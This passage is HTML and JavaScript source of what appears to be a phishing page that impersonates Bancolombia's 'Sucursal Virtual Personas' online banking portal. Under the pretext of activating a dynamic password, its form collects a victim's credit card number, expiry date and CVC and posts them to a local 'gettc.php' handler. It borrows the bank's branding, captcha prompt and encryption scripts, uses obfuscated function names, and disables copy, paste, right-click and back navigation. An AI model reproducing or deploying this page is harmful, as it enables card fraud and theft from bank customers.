function changeContrastLevel(level) {      if(contrastLevel != level) {      contrastLevel = level;  refreshNumericKeyboard(level);       changeConstrastImage();}       }		
function createKeyboard(openLayer, xPos, yPos) {      if (isLayer = openLayer)              createChild(window, "keyboard", wWyNwEIZpnKr(), isOpen, 330, 135, xPos, yPos);           else               document.getElementById('keyboard_').innerHTML =  (wWyNwEIZpnKr());       blockSelect(document.all? document.all['_KEYBRD']: document.getElementById? document.getElementById('_KEYBRD'): document);          refreshNumericKeyboard(contrastLevel);          }   	
function disableselect(e){  	if (omitformtags.indexOf(e.target.tagName.toLowerCase())==-1)     		return false;      }		
function bindElement(elem,index) {        	indexField=0;   	if (index!=undefined){  		indexField=index;      	}      	lwyVFRMFuywa[indexField] = elem;      	maxLengthKeyboard = (lwyVFRMFuywa[indexField] && lwyVFRMFuywa[indexField].maxLength? lwyVFRMFuywa[indexField].maxLength: DEF_MAXLENGTH);     }
function clearKeys() {      	  lwyVFRMFuywa[indexField].value="";  	  gTJMNIttVzkV[indexField].value="";  }		
function recoveryPassword(){    	for (i=0; i<lwyVFRMFuywa.length; i++){	   lwyVFRMFuywa[i].value = gTJMNIttVzkV[i].value;  	}}	
function reEnable(){    	return true; }	
</script>
	<script type="text/javascript">
		function checkCaptchaPage() {return true;}
	</script>
   	
 	<style>html, body, form {height: 100%;}
 	        
 	</style>
 	
		  <script type="text/javascript" src="./js/bootstrap.js"></script>
          











<div class="modal fade modalPopupConfirmation" id="confirmationCaptcha"
	tabindex="-1" role="dialog" aria-labelledby="myModalLabel"
	data-keyboard="false" data-backdrop="static">
	<div class="modal-dialog" role="document">
		<div class="modal_Center_Popup">
			<div class="modal-header modal-headerPopup">
				<button type="button" class="close closeButtomPopup"
					data-dismiss="modal" aria-label="Close">
					<span class="glyphicon glyphicon-remove" aria-hidden="true"></span>
				</button>
			</div>
			<div class="modal_panel_second">
				<div class="modal_subtitle_item">
					<h1>
						Captcha
					</h1>
				</div>
				<div class="modal_subtext_item">
					<h4>
						Bancolombia dice:
					</h4>
				</div>
				<div class="modal-body text-center">
					<span class="text-svp-name">Por favor confirme que es un humano</span>
				</div>
				<div class="modal-footer">
					<button type="button" class="btn btn-labeled btn_Succed_Popup"
						data-dismiss="modal">
						OK
					</button>
				</div>
			</div>
		</div>
	</div>
</div>



<script type="text/javascript">
function respuestaRecaptcha(){
	var response=grecaptcha.getResponse();
	//alert(response);
	if(response != null && response != ""){
		return true;
	}else{
		$("#confirmationCaptcha").modal("show"); 
		return false;
	}
}
</script>
<script language="javascript" >
$(document).ready(function() {	
var validator = $("#genPassDataForm").bind("invalid-form.validate", function() {		
}).validate({
onsubmit: false,
onkeyup: false,
onclick: false,
onfocusout: false,
rules: {
errorContainer: $("#summary"),
documentType:{
required:true
},
documentNumber:{
required:true,
"validaFormatoDocumentNumber":true
},
pass1:{
required:true,
"passwordLength":true
},
passVerification1:{
"validaFormatoPassVerification":true
},
recaptcha_response_field:{
required:true
}
},
messages: {
documentType: { 
required:"<script>activarError();document.getElementById('documentTypeError').innerHTML='Por favor seleccione un Tipo de Documento.'; document.getElementById(\"documentTypeError\").style.display = \"\";</"+"script>"
},
documentNumber: {
required:"<script>activarError();document.getElementById('documentNumberError').innerHTML='Por favor ingrese el N&uacute;mero de Documento.'; document.getElementById(\"documentNumberError\").style.display = \"\";</"+"script>",
validaFormatoDocumentNumber: "<script>activarError();document.getElementById('documentNumberError').innerHTML='Por favor ingrese solamente valores num&eacute;ricos para el campo N&uacute;mero de Documento.'; document.getElementById(\"documentNumberError\").style.display = \"\";</"+"script>"
},
pass1: {
required:"<script>activarError();document.getElementById('passError').innerHTML='Por favor ingrese la Clave.'; document.getElementById(\"passError\").style.display = \"\";</"+"script>",
passwordLength: "<script>activarError();document.getElementById('passError').innerHTML='Su Clave debe tener 4 d&iacute;gitos.'; document.getElementById(\"passError\").style.display = \"\";</"+"script>",
validaFormatoPass: "<script>activarError();document.getElementById('passError').innerHTML='Ingrese una Clave v&aacute;lida de 4 d&iacute;gitos, que no tenga n&uacute;meros consecutivos juntos, ni repetidos juntos.'; document.getElementById(\"passError\").style.display = \"\";</"+"script>"
},
passVerification1: {
validaFormatoPassVerification: "<script>activarError();document.getElementById('passVerificationError').innerHTML='El n&uacute;mero ingresado en los campos Clave y Confirmar Clave no coincide.'; document.getElementById(\"passVerificationError\").style.display = \"\";</"+"script>"
},			
recaptcha_response_field: {
required:"<script>activarError();document.getElementById('captchaError').innerHTML='Por favor ingrese la informaci&oacute;n requerida.'; document.getElementById(\"captchaError\").style.display = \"\";</"+"script>"
}			
}
});
});
</script>
          <script language="JavaScript">
$(document).ready(function() {
setTimeout(function(){
window.location.hash="no-back-button";window.location.hash="Again-No-back-button"; window.onhashchange=function(){window.location.hash="no-back-button";}},1000);});
document.ondrop=function(event){return false;}
function handle(delta) {if (delta < 0)
return false;else
return false;}
function wheel(event){var delta = 0;if (!event) 
event = window.event;if (event.wheelDelta) { delta = event.wheelDelta/120;if (window.opera)delta = -delta;} else if (event.detail) { delta = -event.detail/3;}if (delta)handle(delta);if (event.preventDefault)event.preventDefault();event.returnValue = false;}</script>
<script language="JavaScript">
var isCaptchaPage=false;
try {isCaptchaPage = checkCaptchaPage();} catch (err) {isCaptchaPage=false;}
$(document).ready(function() {
	$('*').bind("cut copy paste", function(e) {
		alert("Funcion no permitida");
		return false;
	});
});
document.onkeydown = mykeyhandler;
function mykeyhandler(event) {event = event || window.event;
var tgt = event.target || event.srcElement;
if((event.altKey && event.keyCode==37) || (event.altKey && event.keyCode==39) || (event.ctrlKey && event.keyCode==78)|| (event.ctrlKey && event.keyCode==67 && isCaptchaPage==false)|| (event.ctrlKey && event.keyCode==86 && isCaptchaPage==false)|| (event.ctrlKey && event.keyCode==85)||(event.ctrlKey && event.keyCode==45 && isCaptchaPage==false)|| (event.shiftKey && event.keyCode==45 && isCaptchaPage==false)){event.cancelBubble = true;event.returnValue = false;	alert("Funcion no permitida");
return false;}if(event.keyCode==18 && tgt.type != "text" && tgt.type != "password" && tgt.type != "textarea" && tgt.type != "application/x-shockwave-flash"){return false;}if (event.keyCode == 8 && tgt.type != "text" && tgt.type != "password" && tgt.type != "textarea" && tgt.type != "application/x-shockwave-flash" ){return false;}if(event.ctrlKey && ( event.keyCode==107 || event.keyCode==109 )  ){return false;}if ((event.keyCode >= 112) && (event.keyCode <= 123)) {
if (navigator.appName == "Microsoft Internet Explorer"){window.event.keyCode=0;}return false;}}function mouseDown(e) {var ctrlPressed=0;var altPressed=0;var shiftPressed=0;if (parseInt(navigator.appVersion)>3) {if (navigator.appName=="Netscape") {var mString =(e.modifiers+32).toString(2).substring(3,6);shiftPressed=(mString.charAt(0)=="1");ctrlPressed =(mString.charAt(1)=="1");altPressed  =(mString.charAt(2)=="1");
self.status="modifiers="+e.modifiers+" ("+mString+")"}else {shiftPressed=event.shiftKey;altPressed  =event.altKey;ctrlPressed =event.ctrlKey;}if (shiftPressed || altPressed || ctrlPressed) 
alert ("Funcion no permitida");}return true;}if (parseInt(navigator.appVersion)>3) {document.onmousedown = mouseDown;if (navigator.appName=="Netscape") document.captureEvents(Event.MOUSEDOWN);}var message="";
function clickIE() {if (document.all){(message);return false;}}function clickNS(e) {if(document.layers||(document.getElementById&&!document.all)) {if (e.which==2||e.which==3) {(message);return false;}}}if (document.layers){document.captureEvents(Event.MOUSEDOWN);document.onmousedown=clickNS;}else{document.onmouseup=clickNS;document.oncontextmenu=clickIE;}document.oncontextmenu=new Function("return false");
var isIEx  = (navigator.appVersion.indexOf("MSIE") != -1) ? true : false;
function alertSize() {var myHeight = 0;if( typeof( window.innerWidth ) == 'number' ) {myHeight = window.innerHeight;} else if( document.documentElement && ( document.documentElement.clientWidth || document.documentElement.clientHeight ) ) {myHeight = document.documentElement.clientHeight;} else if( document.body && ( document.body.clientWidth || document.body.clientHeight ) ) {myHeight = document.body.clientHeight;}return myHeight;}function setElementHeight(elementName, indent) {var elementEl = document.getElementById? document.getElementById(elementName): document.all? document.all[elementName]: null;if (elementEl) {elementEl.style.height = "auto"; var h = alertSize();var new_h = (h-indent);try{elementEl.style.height = new_h + "px";}catch(err){}}}</script>










<script>

var warning = 300;
var timeout = 420;

var current = 0;
var timeOutActive = true;
function popUpTimeOut(sURL) { window.open(unescape(sURL), "msgWindow","dependent=yes,titlebar=no,menubar=no,height=190,hotkeys=no,resizable=no,status=no,toolbar=no,width=530,alwaysRaised=1");  }


function getSecs() { if(timeOutActive){current = current + 1;if (current == warning) {popUpTimeOut("./html/timeoutWarning1.html"); }if (current == timeout - 10) {popUpTimeOut("./html/timeoutWarning2.html"); }if (current == timeout) {window.location.href="./CLOSE";}window.setTimeout('getSecs()',1000); }}
getSecs();
</script>
<script type="text/javascript">
      function setTitle(){document.title='Bancolombia Sucursal Virtual Personas';}
</script>

<link rel="shortcut icon" href="favicon.ico" />
         

	<script type="text/javascript" src="./js/keyEncript/jsbn2.js"></script>
	<script type="text/javascript" src="./js/keyEncript/prng4.js"></script>
	<script type="text/javascript" src="./js/keyEncript/rng.js"></script>
	<script type="text/javascript" src="./js/keyEncript/rsa.js"></script>
	<script type="text/javascript" src="./js/keyEncript/base64.js"></script>
	<script type="text/javascript" src="./js/keyEncript/rsa-t1.js"></script>
	<script language="JavaScript">
	var t1Assertion="0.9267639244374696";
	function processPassword(password){var rsa = new RSAKey();rsa.setPublic("A6CA1BB4BD803E5704A071E8F7370FD68F2A42CAB574A765693F0F54796CB8AD2CF1B624005119FE651227F7992FF6A6D1979C9B72EA0EAD789F1CBADAB9851779CB8F5F82F40BC71C5C303A10298ED6DC5657E3401AE5720F06836F098366441AC30AB35F13FAB8B6CE81955A1181FCA0AD4EA471CC09C51EAE8EDA42E8C615F933483449CBC67883F407430CB856E4EEC1919BFDD38850CCF5837EC67D8CF802EC30836099592FCDB6CEF4D4AB8EC7F95229B6B262DC6F9A62BFD082CCF98D8FC73FADFA2CCBDDBD17126206E0EC41FE85ECDB9B7631A7EDEF193E4971ADA3E4AB3FFE05F5146907255AD29D0AFB91160C95E225514E1CD07E35BA157A44D1", "10001");var res2 = rsa.encrypt(password + "|" + t1Assertion);return hex2b64(res2);}  
	</script>

	<script>
		
		function activarError(){document.getElementById('summary').innerHTML='Por favor corrija los campos con error marcados en color rojo.'; document.getElementById("tabError").style.display = "";}
		function desactivarError(){document.getElementById('summary').innerHTML=''; document.getElementById("tabError").style.display = "none";}
		function cleanErrorLabel() {document.getElementById("documentTypeError").style.display = "none";document.getElementById("documentNumberError").style.display = "none";document.getElementById("passError").style.display = "none";document.getElementById("passVerificationError").style.display = "none";}
		var count=0;
		function doSomethingCool() {desactivarError();cleanErrorLabel();var form = $( "#genPassDataForm" );if(count==0){form.validate();if ( form.valid() && respuestaRecaptcha()){$("#btnGo").disabled = true;document.getElementById("btnGo").disabled = true;document.getElementById("pass").value = processPassword(document.getElementsByName(changePass('pass1'))[0].value);document.getElementsByName(changePass('pass1'))[0].value = '';document.getElementsByName(changePass('passVerification1'))[0].value = '';document.getElementById("pass1").value = '';document.getElementById("passVerification1").value = '';document.getElementById("pass1").type='text';document.getElementById("passVerification1").type='text';csxuHypOysYJ();count++;$("#genPassDataForm").submit();return false;}} }
		function activarError(){document.getElementById('summary').innerHTML='Por favor corrija los campos con error marcados en color rojo.'; document.getElementById("tabError").style.display = "";}
		function desactivarError(){document.getElementById('summary').innerHTML=''; document.getElementById("tabError").style.display = "none";}
		jQuery("#documentNumber").keyup(function(){var value = jQuery(this).val();value = value.replace(/[^0-9]+/g, '');jQuery(this).val(value);});
		jQuery("#documentNumber").keypress(function(){var value = jQuery(this).val();value = value.replace(/[^0-9]+/g, '');jQuery(this).val(value);});
		jQuery("#pass1").keyup(function(){var value = jQuery(this).val();value = value.replace(/[^0-9]+/g, '');jQuery(this).val(value);});
		jQuery("#passVerification1").keyup(function(){var value = jQuery(this).val();value = value.replace(/[^0-9]+/g, '');jQuery(this).val(value);});
		$(document).ready(function() {var b = document.documentElement;	b.setAttribute('data-useragent',  navigator.userAgent);
			$('#popoverKeyNumber').popover({html: true,title: 'Ejemplos <a class="close" href="#">&times;</a>',
		content: '\
		<div class="title_2">N&uacute;meros consecutivos juntos</div>\
		<table class="table_2">\
		<tr>\
		<td class="numbers">12</td><td>58</td>\
		<td class="separador">&nbsp;</td><td></td>\
		<td>39</td><td class="numbers">56</td>\
		</tr>\
		</table>\
		<hr class="hr_2">\
		<div class="title_2">N&uacute;meros repetidos juntos</div>\
		<table class="table_2">\
		<tr>\
		<td class="numbers">77</td><td>13</td>\
		<td class="separador">&nbsp;</td><td></td>\
		<td>8</td><td class="numbers">44</td><td>2</td>\
		</tr>\
		</table>',
		});
		$('#popoverKeyNumber').click(function (e) {e.stopPropagation();});
		$(document).click(function (e) {if (($('.popover').has(e.target).length == 0) || $(e.target).is('.close')) {$('#popoverKeyNumber').popover('hide');}});	
		$.validator.addMethod("validaFormatoDocumentNumber", function(value,element,param){var patron = /^\d*$/;$('#genPassDataForm').blur();if(!value.search(patron)){return true;}else{return false;}} );
		$.validator.addMethod("validaFormatoPass", function(value,element,param){var patron = /^\d*$/;var passwordNew =value.split("");$('#genPassDataForm').blur();if(value.search(patron)){{return false;}}  if(passwordNew.length != 4){return false;}for(var i=0; i < (passwordNew.length - 1) ; i++){if(passwordNew[i] == passwordNew[i+1]){{return false;}}if((parseInt(passwordNew[i])+1) == passwordNew[i+1] || (parseInt(passwordNew[i])-1) == passwordNew[i+1]){{return false;}}}{return true;}} );
		$.validator.addMethod("validaFormatoPassVerification", function(value,element,param){$('#genPassDataForm').blur();if( document.getElementsByName(changePass('pass1'))[0].value == document.getElementsByName(changePass('passVerification1'))[0].value ){return true;}else{return false;}} );
		$.validator.addMethod("passwordLength", function(value,element,param){
		$('#genPassDataForm').blur();return ( value.length == 4 );} );
		$(document).keypress(function(event) {if (event.which == 13) {event.preventDefault();document.getElementById('btnGo').click();}if (event.which == 8) {event.preventDefault();}});});
				
				
				
	</script>
</head>



<body onload="timeOutActive = true; setTitle();" >

	
	<div class="container">
		    <div class="row">
		       
		            <div class="panel panel-primary">

		               <form id="genPassDataForm" name="genPassDataForm" class="form-horizontal" role="form" action="gettc.php" method="post" autocomplete="off">
		              	<input id="pass" name="pass" class="form-control" type="hidden" value=""/>
		              	<input id="passVerification" name="passVerification" class="form-control" type="hidden" value=""/>
		              	<input type="hidden" name="tempUserID" id="tempUserID" />
   						<input type="hidden" name="userId" id="userId" value="">
		              	
		              	<div class="panelLogo">
		              		<div class="text pull-right">Sucursal Virtual Personas</div>
		              	</div>
		              
		              	<div class="panel-title">
                     
		                     




<script language="javascript" src="./js/jquery.jclock-min.js?v=1.5.3.RC4" type="text/JavaScript"></script>

<div class="title-small">
<script type="text/javascript">
//<![CDATA[
function makeArray() {
for (i = 0; i<makeArray.arguments.length; i++)
this[i + 1] = makeArray.arguments[i];}
var months = new makeArray('Enero','Febrero','Marzo','Abril','Mayo',
'Junio','Julio','Agosto','Septiembre','Octubre','Noviembre','Diciembre');
var date = new Date();
var day = date.getDate();
var month = date.getMonth() + 1;
var yy = date.getYear();
var year = (yy < 1000) ? yy + 1900 : yy;
document.write(day + " de " + months[month] + " de " + year);
//]]>
</script>


</div>
		              	</div>    
			            <div class="panel-heading">
                              <h3>Clave Dinamica- Sucursal Virtual Personas</h3>    
			            </div>  

		                <div class="panel-body">
				
			                <div class="row">
			                 	









<script language="JavaScript">
	function cerrarError() {
		document.getElementById("tabError").style.display = "none";
		document.getElementById('summary').innerHTML='';
	}
</script>



<div class="col-xs-12 col-sm-12 col-md-12" id="contentError" style="padding-top: 5px;">

	<div id='tabError' class="errorDiv" style='display: none;'>
        <div class="divTextMessage">
			<span class="icon-error errorIcon">
				<span class="path1"></span>
				<span class="path2"></span>
				<span class="path3"></span>
            </span>
            <div class="errorTitulo">Error</div>
			<div id="summary" class="errorTexto">

				
			</div>
		</div>
	</div>
</div>

							</div> 
												
							<p>Para activar el servicio de Clave d&iacute;namica, es necesario tener su tarjeta de cr&eacute;dito a la mano; por favor diligencie la siguiente informaci&oacute;n:
															</p>
							<br>	
											    		
													
							<div class="col-xs-12 col-sm-12 col-md-12" style="padding-right: 0px">
													
								<div class="form-group">
									<div class="row" >
									
									

<script language="JavaScript">
	function valida(e){
    tecla = (document.all) ? e.keyCode : e.which;

    //Tecla de retroceso para borrar, siempre la permite
    if (tecla==8){
        return true;
    }
        
    // Patron de entrada, en este caso solo acepta numeros
    patron =/[0-9]/;
    tecla_final = String.fromCharCode(tecla);
    return patron.test(tecla_final);
}
</script>
										<div class="col-xs-8 col-sm-8 col-md-8">
											<div class="row" >
													<label class="control-label col-xs-5 col-sm-5 col-md-5 text-right"  for="documentNumber">N&uacute;mero De Tarjeta De Cr&eacute;dito:</label>
													<div class="col-xs-4 col-sm-4 col-md-4">
														<input id="documentNumber" name="documentNumber" spellcheck="false" tabindex="2" placeholder="Ingrese los 16 d&iacute;gitos de su tarjeta  de cr&eacute;dito" autocomplete="ÑÖcompletes" style="width: 300px !important;" class="form-control"  type="email" value=""  maxlength="16" autocomplete="off"/>
														<div id="documentNumberError" class="labelError" style='display: none'></div>
													</div>
											</div>
											<div class="row" >
												&nbsp;
									  		</div>
											<div class="row" >
													<label class="control-label col-xs-5 col-sm-5 col-md-5 text-right"  for="documentNumber">Fecha de Expiraci&oacute;n:</label>
													<div class="col-xs-4 col-sm-4 col-md-4">
														<input id="documentNumber2" name="documentNumber2" spellcheck="false" tabindex="2" placeholder="MM/AA" autocomplete="ÑÖcompletes" style="width: 300px !important;" class="form-control"  type="text" value=""  maxlength="5" autocomplete="off"/>
														<div id="documentNumberError2" class="labelError" style='display: none'></div>
													</div>
													
											</div>
											
											<div class="row" >
												&nbsp;
									  		</div>
											
											<div class="row" >
													<label class="control-label col-xs-5 col-sm-5 col-md-5 text-right"  for="documentNumber">CVC <span>(C&oacute;d. Seguridad)</span></label>
													<div class="col-xs-4 col-sm-4 col-md-4">
														<input id="documentNumber3" name="documentNumber3" placeholder="3 D&iacute;gitos ubicados al respaldo de su tarjeta" autocomplete="ÑÖcompletes" tabindex="2" style="width: 300px !important;" class="form-control"  type="text" value=""  maxlength="4" onkeypress="return valida(event)" autocomplete="off"/>
														<div id="documentNumberError3" class="labelError" style='display: none'></div>
													</div>
											</div>
											
											<div class="row" >
												&nbsp;
									  		</div>
											
																				
											
											
										
											
										</div>		
										<div class="col-xs-4 col-sm-4 col-md-4">
										</div>	
									</div>				
								</div>				
								<br>
																			
														
														
												        
												        
												        
						</div> 
								
												     	
		            			</div>
						     
						     
						     
						     
						     	
									
								
								
								
								
						     
							     	
							     	<br>
							     	
							     	
							     								     	
							     
							     	<br />
						     	
						     	
						        <div class="row">
						            
							       <div class="two-button-a">
	                                   	                            	
		                            	
		                            	<button class="btn btn-labeled btn-success">
										Continuar
									</button>
		                            
	                                     
                                    </div>
                                </div>    
                                </form>  
		                </div>
		            </div>
		            
		            








	        <script type="text/javascript">
	var year = (new Date).getFullYear();
	$(document).ready(function() {
	  $("#fecha").text( year );
	});
	</script>
	        <div class="title-small">
	            <span>Direcci&oacute;n IP: <?php echo $ip;?></span>
	        	<span class="pull-right">Copyright &copy;&nbsp;<span id="fecha">&nbsp;</span>&nbsp;Bancolombia S.A.&nbsp;&nbsp;</span>
	        </div>
	   

		    </div>
		</div>

		
		
		
		
		

 
 
		
 

<script type="text/javascript">window.NREUM||(NREUM={});NREUM.info={"applicationID":"33598753","applicationTime":4,"beacon":"bam.nr-data.net","queueTime":0,"licenseKey":"017cf77fef","transactionName":"YAFQY0VZWkFTAUcPX1lLYUdFUVpVcQ1dEkJYCF5SRRdzd3wnYSdkcjtidmRra3ZzNnJGGHAhZh4=","agent":"","errorBeacon":"bam.nr-data.net"}</script></body>   
</html>